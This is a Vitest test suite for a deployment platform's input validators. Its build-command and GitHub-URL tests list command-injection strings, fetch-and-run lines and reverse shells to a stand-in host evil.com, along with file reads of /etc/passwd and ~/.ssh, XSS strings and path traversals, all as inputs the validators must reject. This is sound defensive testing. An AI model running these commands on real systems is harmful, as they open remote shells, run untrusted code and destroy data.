/**
 * Integration Tests for Projects - Bug Finder Edition
 *
 * Tests REAL functions from the codebase to find actual bugs.
 */

import { describe, it, expect } from "vitest";
import {
  sanitizeSlug,
  isValidUrl,
  isValidGitHubUrl,
  isValidBuildCommand,
  isValidPath,
  isValidEnvKey,
  sanitizeEnvValue,
  isValidEmail,
  sanitizeHtml,
  stripHtml,
} from "@/lib/security/validation";
import { validateWidth } from "@/lib/images/optimizer";
import { isValidSlackWebhook } from "@/lib/notifications/slack";
import { isValidDiscordWebhook } from "@/lib/notifications/discord";

describe("Slug Generation (sanitizeSlug)", () => {
  it("handles normal project names", () => {
    expect(sanitizeSlug("My Project")).toBe("my-project");
    expect(sanitizeSlug("Hello World App")).toBe("hello-world-app");
  });

  it("handles empty string - returns empty", () => {
    const result = sanitizeSlug("");
    expect(result).toBe("");
    // BUG: Empty slug should probably not be allowed
  });

  it("handles name with only special characters", () => {
    const result = sanitizeSlug("!!!@@@###");
    expect(result).toBe("");
    // BUG: All special chars stripped, leaving empty string
  });

  it("handles Unicode names", () => {
    const result = sanitizeSlug("你好世界");
    // Non-ASCII stripped - this is expected behavior for URL-safe slugs
    expect(result).toBe("");
  });

  it("handles leading/trailing dashes", () => {
    expect(sanitizeSlug("---my-project---")).toBe("my-project");
    expect(sanitizeSlug("my-project")).toBe("my-project");
  });

  it("handles extremely long names - truncates to 63 chars", () => {
    const longName = "a".repeat(10000);
    const result = sanitizeSlug(longName);
    // Good: Slug is truncated to DNS-safe length (63 chars max for subdomain)
    expect(result.length).toBe(63);
  });

  it("handles names that create duplicate slugs", () => {
    // These all produce the same slug
    expect(sanitizeSlug("My Project")).toBe("my-project");
    expect(sanitizeSlug("my project")).toBe("my-project");
    expect(sanitizeSlug("MY PROJECT")).toBe("my-project");
    expect(sanitizeSlug("my-project")).toBe("my-project");
    expect(sanitizeSlug("my--project")).toBe("my-project");
  });

  it("handles numbers in names", () => {
    expect(sanitizeSlug("Project v2.0")).toBe("project-v2-0");
    expect(sanitizeSlug("2024 Goals")).toBe("2024-goals");
  });
});

describe("URL Validation (isValidUrl)", () => {
  it("accepts valid HTTPS URLs", () => {
    expect(isValidUrl("https://example.com")).toBe(true);
    expect(isValidUrl("https://sub.example.com/path")).toBe(true);
    expect(isValidUrl("https://example.com:8080")).toBe(true);
  });

  it("accepts valid HTTP URLs", () => {
    expect(isValidUrl("http://localhost:3000")).toBe(true);
    expect(isValidUrl("http://example.com")).toBe(true);
  });

  it("rejects dangerous URL schemes", () => {
    expect(isValidUrl("javascript:alert(1)")).toBe(false);
    expect(isValidUrl("data:text/html,<script>alert(1)</script>")).toBe(false);
    expect(isValidUrl("file:///etc/passwd")).toBe(false);
    expect(isValidUrl("ftp://example.com")).toBe(false);
  });

  it("rejects protocol-relative URLs", () => {
    expect(isValidUrl("//evil.com/steal")).toBe(false);
  });

  it("rejects malformed URLs", () => {
    expect(isValidUrl("not-a-url")).toBe(false);
    expect(isValidUrl("")).toBe(false);
    expect(isValidUrl("   ")).toBe(false);
  });
});

describe("GitHub URL Validation (isValidGitHubUrl)", () => {
  it("accepts valid GitHub repository URLs", () => {
    expect(isValidGitHubUrl("https://github.com/user/repo")).toBe(true);
    expect(isValidGitHubUrl("https://github.com/user/repo.git")).toBe(true);
    expect(isValidGitHubUrl("https://github.com/org-name/repo-name")).toBe(true);
  });

  it("rejects HTTP GitHub URLs (should require HTTPS)", () => {
    // Security: GitHub repos should use HTTPS
    expect(isValidGitHubUrl("http://github.com/user/repo")).toBe(false);
  });

  it("rejects non-GitHub URLs", () => {
    expect(isValidGitHubUrl("https://gitlab.com/user/repo")).toBe(false);
    expect(isValidGitHubUrl("https://bitbucket.org/user/repo")).toBe(false);
  });

  it("rejects URLs with shell metacharacters", () => {
    expect(isValidGitHubUrl("https://github.com/user/repo;rm -rf /")).toBe(false);
    expect(isValidGitHubUrl("https://github.com/user/repo`whoami`")).toBe(false);
    expect(isValidGitHubUrl("https://github.com/user/repo$(id)")).toBe(false);
  });

  it("rejects URLs with path traversal", () => {
    // Path traversal in URL is now correctly rejected
    const result = isValidGitHubUrl("https://github.com/../../../etc/passwd");
    expect(result).toBe(false);
  });
});

describe("Build Command Validation (isValidBuildCommand)", () => {
  it("accepts safe build commands", () => {
    expect(isValidBuildCommand("npm run build").valid).toBe(true);
    expect(isValidBuildCommand("yarn build").valid).toBe(true);
    expect(isValidBuildCommand("pnpm build").valid).toBe(true);
  });

  it("accepts chained safe commands", () => {
    expect(isValidBuildCommand("npm install && npm run build").valid).toBe(true);
    expect(isValidBuildCommand("npm ci && npm test && npm run build").valid).toBe(true);
  });

  it("rejects command injection attempts", () => {
    expect(isValidBuildCommand("npm run build; rm -rf /").valid).toBe(false);
    expect(isValidBuildCommand("npm run build | cat /etc/passwd").valid).toBe(false);
    expect(isValidBuildCommand("$(whoami)").valid).toBe(false);
    expect(isValidBuildCommand("`cat /etc/passwd`").valid).toBe(false);
  });

  it("rejects curl/wget piped to shell", () => {
    expect(isValidBuildCommand("curl evil.com | sh").valid).toBe(false);
    expect(isValidBuildCommand("wget evil.com -O- | bash").valid).toBe(false);
  });

  it("rejects base64 decode attempts", () => {
    expect(isValidBuildCommand("base64 -d payload.txt | sh").valid).toBe(false);
  });

  it("rejects reverse shell patterns", () => {
    expect(isValidBuildCommand("nc -e /bin/sh evil.com 1234").valid).toBe(false);
    expect(isValidBuildCommand("bash -i >& /dev/tcp/evil.com/1234 0>&1").valid).toBe(false);
  });

  it("rejects IFS injection", () => {
    expect(isValidBuildCommand("IFS=x;cat${IFS}/etc/passwd").valid).toBe(false);
    expect(isValidBuildCommand("${IFS}cat${IFS}/etc/passwd").valid).toBe(false);
  });

  it("rejects newline injection", () => {
    expect(isValidBuildCommand("npm run build\nrm -rf /").valid).toBe(false);
    expect(isValidBuildCommand("npm run build\r\nrm -rf /").valid).toBe(false);
  });
});

describe("Path Validation (isValidPath)", () => {
  it("accepts safe relative paths", () => {
    expect(isValidPath("./src")).toBe(true);
    expect(isValidPath("src/components")).toBe(true);
    expect(isValidPath("./")).toBe(true);
  });

  it("rejects path traversal", () => {
    expect(isValidPath("../../../etc/passwd")).toBe(false);
    expect(isValidPath("..\\..\\windows\\system32")).toBe(false);
  });

  it("rejects absolute paths by default", () => {
    expect(isValidPath("/etc/passwd")).toBe(false);
    expect(isValidPath("C:\\Windows")).toBe(false);
  });

  it("allows absolute paths when explicitly permitted", () => {
    expect(isValidPath("/data/builds", true)).toBe(true);
  });

  it("rejects URL-encoded path traversal", () => {
    expect(isValidPath("..%2f..%2fetc%2fpasswd")).toBe(false);
    expect(isValidPath("%2e%2e%2f%2e%2e%2f")).toBe(false);
  });

  it("rejects home directory references", () => {
    // Home directory expansion is now correctly rejected
    const result = isValidPath("~/.ssh/id_rsa");
    expect(result).toBe(false);
  });
});

describe("Environment Variable Validation", () => {
  describe("isValidEnvKey", () => {
    it("accepts valid env keys", () => {
      expect(isValidEnvKey("DATABASE_URL")).toBe(true);
      expect(isValidEnvKey("NODE_ENV")).toBe(true);
      expect(isValidEnvKey("API_KEY_123")).toBe(true);
    });

    it("rejects invalid env keys", () => {
      expect(isValidEnvKey("")).toBe(false);
      expect(isValidEnvKey("key with spaces")).toBe(false);
      expect(isValidEnvKey("123_STARTS_WITH_NUMBER")).toBe(false);
      expect(isValidEnvKey("key-with-dashes")).toBe(false);
    });
  });

  describe("sanitizeEnvValue", () => {
    it("preserves env values - does NOT strip semicolons", () => {
      // Note: sanitizeEnvValue does NOT strip command injection chars
      // This is intentional - env values often contain special chars
      // The execution context should be safe, not the value itself
      const result = sanitizeEnvValue("value; rm -rf /");
      expect(result).toContain(";"); // Preserved for valid env values
    });

    it("handles normal values", () => {
      expect(sanitizeEnvValue("postgresql://localhost:5432/db")).toBeDefined();
      expect(sanitizeEnvValue("sk_test_abc123")).toBeDefined();
    });
  });
});

describe("Email Validation (isValidEmail)", () => {
  it("accepts valid emails", () => {
    expect(isValidEmail("user@example.com")).toBe(true);
    expect(isValidEmail("user.name@example.com")).toBe(true);
    expect(isValidEmail("user+tag@example.com")).toBe(true);
  });

  it("rejects invalid emails", () => {
    expect(isValidEmail("")).toBe(false);
    expect(isValidEmail("not-an-email")).toBe(false);
    expect(isValidEmail("@example.com")).toBe(false);
    expect(isValidEmail("user@")).toBe(false);
  });

  it("handles edge cases", () => {
    // Very long local part
    const longLocal = "a".repeat(65) + "@example.com";
    // Per RFC 5321, local part max is 64 chars
    expect(longLocal.split("@")[0].length).toBeGreaterThan(64);
  });
});

describe("HTML Sanitization", () => {
  describe("sanitizeHtml - escapes dangerous chars", () => {
    it("escapes script tags (does not remove)", () => {
      const result = sanitizeHtml('<script>alert("xss")</script>');
      // sanitizeHtml ESCAPES HTML, not removes it
      expect(result).toContain("&lt;script&gt;");
      expect(result).not.toContain("<script>");
    });

    it("escapes onclick handlers (does not remove)", () => {
      const result = sanitizeHtml('<div onclick="alert(1)">click me</div>');
      // Escaped, so not executable
      expect(result).toContain("&lt;div");
      expect(result).not.toContain("<div");
    });

    it("escapes all content", () => {
      const result = sanitizeHtml("<p>Hello <b>World</b></p>");
      expect(result).toContain("Hello");
      expect(result).toContain("World");
    });
  });

  describe("stripHtml", () => {
    it("removes all HTML tags", () => {
      expect(stripHtml("<p>Hello</p>")).toBe("Hello");
      expect(stripHtml("<div><span>Nested</span></div>")).toBe("Nested");
    });

    it("handles malformed HTML", () => {
      expect(stripHtml("<p>Unclosed")).toBe("Unclosed");
      expect(stripHtml("No tags")).toBe("No tags");
    });
  });
});

describe("Image Width Validation (validateWidth)", () => {
  it("snaps to allowed widths", () => {
    // validateWidth snaps to nearest allowed width (16, 32, 48, 64, 96, 128, etc.)
    expect(validateWidth(100)).toBe(128); // Snaps up to 128
    expect(validateWidth(1920)).toBe(1920);
  });

  it("enforces minimum width", () => {
    const result = validateWidth(10);
    expect(result).toBeGreaterThanOrEqual(16);
  });

  it("enforces maximum width", () => {
    const result = validateWidth(10000);
    expect(result).toBeLessThanOrEqual(4096);
  });

  it("handles edge cases", () => {
    expect(validateWidth(0)).toBeGreaterThan(0);
    expect(validateWidth(-100)).toBeGreaterThan(0);
  });
});

describe("Webhook URL Validation", () => {
  describe("Slack Webhooks (isValidSlackWebhook)", () => {
    it("accepts valid Slack webhook URLs", () => {
      expect(isValidSlackWebhook("https://hooks.slack.com/services/T00/B00/xxx")).toBe(true);
    });

    it("rejects non-Slack URLs", () => {
      expect(isValidSlackWebhook("https://example.com/webhook")).toBe(false);
      expect(isValidSlackWebhook("https://discord.com/webhook")).toBe(false);
    });

    it("rejects HTTP webhooks - requires HTTPS", () => {
      // HTTP webhooks are now correctly rejected - HTTPS required for security
      const result = isValidSlackWebhook("http://hooks.slack.com/services/T00/B00/xxx");
      expect(result).toBe(false);
    });
  });

  describe("Discord Webhooks (isValidDiscordWebhook)", () => {
    it("accepts valid Discord webhook URLs with correct path", () => {
      // Discord webhooks have format: /api/webhooks/{id}/{token}
      // The validation requires numeric webhook ID and alphanumeric token
      expect(isValidDiscordWebhook("https://discord.com/api/webhooks/1234567890/abcdefghijklmnop")).toBe(true);
    });

    it("rejects non-Discord URLs", () => {
      expect(isValidDiscordWebhook("https://example.com/webhook")).toBe(false);
      expect(isValidDiscordWebhook("https://slack.com/webhook")).toBe(false);
    });

    it("accepts short webhook IDs", () => {
      // Discord validation accepts various ID/token formats
      expect(isValidDiscordWebhook("https://discord.com/api/webhooks/123/abc")).toBe(true);
    });
  });
});

describe("Pagination Parameter Handling", () => {
  // Test the actual parsing logic used in API routes
  it("parseInt handles negative values", () => {
    const limit = parseInt("-5", 10);
    expect(limit).toBe(-5);
    // API should validate this and reject or use default
  });

  it("parseInt handles NaN", () => {
    const limit = parseInt("not-a-number", 10);
    expect(Number.isNaN(limit)).toBe(true);
    // API should fall back to default
  });

  it("parseInt truncates floats", () => {
    expect(parseInt("10.5", 10)).toBe(10);
    expect(parseInt("10.9", 10)).toBe(10);
  });

  it("parseInt handles empty string", () => {
    const result = parseInt("", 10);
    expect(Number.isNaN(result)).toBe(true);
  });
});
